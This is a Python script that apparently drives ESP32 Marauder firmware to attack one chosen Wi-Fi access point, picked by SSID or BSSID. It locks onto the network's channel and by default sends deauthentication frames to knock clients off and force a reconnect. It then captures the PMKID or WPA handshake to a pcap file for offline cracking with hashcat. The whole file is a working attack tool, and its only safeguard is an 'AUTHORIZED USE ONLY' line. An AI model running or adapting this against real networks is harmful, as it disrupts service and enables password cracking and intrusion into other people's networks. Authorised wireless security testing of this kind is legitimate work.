#!/usr/bin/env python3
"""
target_pmkid.py -- capture the PMKID/handshake of ONE specific AP, by SSID or BSSID.

  scan  ->  locate the exact target (SSID substring or BSSID)  ->  lock its
  channel  ->  select it  ->  `sniffpmkid -l -d` (capture only the selected AP,
  deauthing it to force a handshake)  ->  stop as soon as a capture marker shows
  on serial, or when the timeout is hit.

Unlike handshake_harvester.py (which sweeps everything), this zeroes in on a
single network. Built from Marauder v1.13.0 primitives. BSSID targeting uses the
BSSID from the streaming scan correlated onto the `list -a` index. Captures land
in a .pcap on the SD card. Requires SD. ESP32-WROOM boards. AUTHORIZED USE ONLY.

  python3 chains/target_pmkid.py --target-ssid "Corp-Guest"
  python3 chains/target_pmkid.py --target-bssid 50:ff:20:84:d6:0f --capture-seconds 90
"""

import argparse
import os
import sys

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from marauder import find_target, add_common_args, connect_from_args  # noqa: E402

# Best-effort markers Marauder prints around an EAPOL/PMKID capture. If none of
# these appear we just run for the full window; the pcap is on SD regardless.
CAPTURE_MARKERS = ["pmkid", "eapol", "handshake", "saved", ".pcap"]


def main():
    ap = argparse.ArgumentParser(description="Targeted PMKID/handshake capture")
    add_common_args(ap)
    g = ap.add_mutually_exclusive_group(required=True)
    g.add_argument("--target-ssid", help="SSID (exact or substring) to target")
    g.add_argument("--target-bssid", help="BSSID (AA:BB:CC:DD:EE:FF) to target")
    ap.add_argument("--scan-seconds", type=int, default=20, help="AP scan duration (default 20)")
    ap.add_argument("--capture-seconds", type=int, default=90, help="max capture window (default 90)")
    ap.add_argument("--no-deauth", action="store_true", help="capture passively (omit the -d deauth)")
    args = ap.parse_args()

    m = connect_from_args(args)
    try:
        print("\n[*] Scanning for {}s ...".format(args.scan_seconds))
        aps = m.scan_full(args.scan_seconds)
        for a in aps:
            print("      " + str(a))
        target = find_target(aps, ssid=args.target_ssid, bssid=args.target_bssid)
        if not target:
            which = args.target_bssid or args.target_ssid
            print("\n[!] Target '{}' not found. (BSSID targeting needs the AP to also "
                  "appear in `list -a`.)".format(which))
            return
        print("\n[*] Target: {}".format(target))

        m.set_channel(target.channel)
        m.select_ap(target.index)
        cmd = "sniffpmkid -l" if args.no_deauth else "sniffpmkid -l -d"
        print("[*] Capturing on ch {} ({}) for up to {}s ...".format(
            target.channel, cmd, args.capture_seconds))
        m.send(cmd)
        hit = m.wait_for(CAPTURE_MARKERS, timeout=args.capture_seconds)
        if hit:
            print("\n[*] Capture activity on serial ('{}'). Letting it flush ...".format(hit))
            m.sleep(5)
        else:
            print("\n[*] Window elapsed with no explicit marker; check the SD .pcap anyway.")
        m.stop()
        print("[*] Done. Pull the .pcap from SD -> hcxpcapngtool -> hashcat.")
    except KeyboardInterrupt:
        print("\n[interrupted]")
    finally:
        m.close()


if __name__ == "__main__":
    main()
